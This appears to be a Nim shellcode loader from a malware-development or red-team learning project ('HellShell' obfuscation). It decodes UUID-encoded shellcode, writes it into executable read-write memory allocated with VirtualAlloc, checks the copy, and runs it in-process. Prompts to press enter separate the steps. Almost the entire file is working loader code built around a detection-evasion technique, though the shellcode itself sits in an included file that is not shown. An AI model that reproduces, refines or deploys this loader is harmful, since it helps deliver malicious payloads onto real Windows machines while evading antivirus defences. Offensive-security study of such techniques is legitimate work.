import src/HellShellpkg/obfuscation
import std/sequtils, strformat
import winim/lean

proc executeShellcode(shellcode: openArray[byte]): bool =
    var pHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, GetCurrentProcessId())
    
    echo "[#] Press enter to allocate memory"
    discard readLine(stdin)
    let 
        shellcodeSize = shellcode.len
        lpAddress: LPVOID = VirtualAlloc(
            NULL,
            shellcodeSize,
            MEM_COMMIT,
            PAGE_EXECUTE_READ_WRITE)
    
    doAssert not lpAddress.isNil(), "[-] Unable to VirtualAlloc"

    echo &"[+] Allocated {shellcode.len} bytes of memory @ {cast[int](lpAddress).toHex}"

    echo "[#] Press enter to copy memory"
    discard readLine(stdin)
    copyMem(lpaddress, shellcode[0].addr, shellcodeSize)
    echo "[+] Copied data into allocated memory"

    var
        memBuf = newSeqWith(shellcodeSize, cast[byte](0))
        bytesRead: SIZE_T
    ReadProcessMemory(
        pHandle, 
        lpAddress, 
        memBuf[0].addr, 
        cast[SIZE_T](shellcodeSize), 
        bytesRead.addr)
    
    echo "Shellcode bytes: ", shellcode[0..5]
    echo "memBuf bytes: ", memBuf[0..5]

    echo "Are equal? ", (shellcode == memBuf)

    echo "[#] Press enter to run the shellcode"
    discard readLine(stdin)
    let payload = cast[proc(){.nimcall.}](lpAddress)
    payload()
    echo "[+] Ran shellcode in memory"
    true

proc main(): void =
    include "uuids.nim"
    let decodedShellcode = shellcode.map(fromUUID).foldl(a & b)  
    discard decodedShellcode.executeShellcode()
when isMainModule:
    main()